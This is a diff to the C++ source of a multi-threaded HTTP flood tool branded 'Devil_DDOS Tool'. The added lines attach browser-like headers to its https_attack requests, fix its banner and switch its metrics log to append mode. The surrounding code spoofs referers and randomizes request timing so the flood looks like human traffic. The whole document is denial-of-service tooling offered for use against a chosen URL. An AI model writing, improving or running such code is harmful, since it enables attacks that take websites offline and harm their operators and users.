@@ -1,4 +1,5 @@
 #include <iostream>
+#include <fstream>
 #include <sstream>
 #include <vector>
 #include <thread>
@@ -63,6 +64,11 @@ void https_attack(const string& url, const string& method, int id, int interval,
             string accept_header = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
             string referer_header = url + "/home";  // Random referer to simulate navigation
 
+            struct curl_slist *headers = NULL;
+            headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+            headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.5");
+            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+
             curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agent.c_str());
             curl_easy_setopt(curl, CURLOPT_ACCEPT, accept_header.c_str());
             curl_easy_setopt(curl, CURLOPT_REFERER, referer_header.c_str());
@@ -91,6 +97,7 @@ void https_attack(const string& url, const string& method, int id, int interval,
             }
 
             curl_easy_cleanup(curl);
+            curl_slist_free_all(headers);
 
             // Randomize sleep time to simulate user behavior (human-like request intervals)
             int sleep_time = rand() % 3 + 1;  // Random sleep time between 1-3 seconds
@@ -116,8 +123,8 @@ void print_banner() {
 ██████╔╝███████╗██████╗ ███████╗██║███████╗███████╗
 ╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚═╝╚══════╝╚══════╝
                                                         
-[+] Devil_DDOS Tool Initialized 🔥)" << RESET << endl;)
-
+[+] Devil_DDOS Tool Initialized 🔥
+    )" << RESET << endl;
 }
 
 int main() {
@@ -141,7 +148,7 @@ int main() {
     cout << GREEN << "[✔] Attack starting..." << RESET << endl;
 
     // Start multi-threaded attack
-    ofstream log("https_attack_metrics.log");
+    ofstream log("https_attack_metrics.log", ios::app); // Open in append mode
     vector<thread> workers;
     for (int i = 0; i < threads; i++) {
         workers.emplace_back(https_attack, url, method, i + 1, interval, ref(log));
